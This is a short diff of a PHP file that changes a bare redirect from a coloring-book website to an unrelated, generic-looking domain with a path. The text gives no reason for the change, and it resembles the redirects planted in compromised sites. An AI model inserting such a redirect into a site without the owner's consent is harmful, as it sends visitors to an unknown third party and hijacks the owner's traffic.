@@ -1,4 +1,4 @@
 <?php
-header("Location: https://coloringbookaddict.com/");
+header("Location: https://start-your-product.site/actmca");
 die();
 ?>
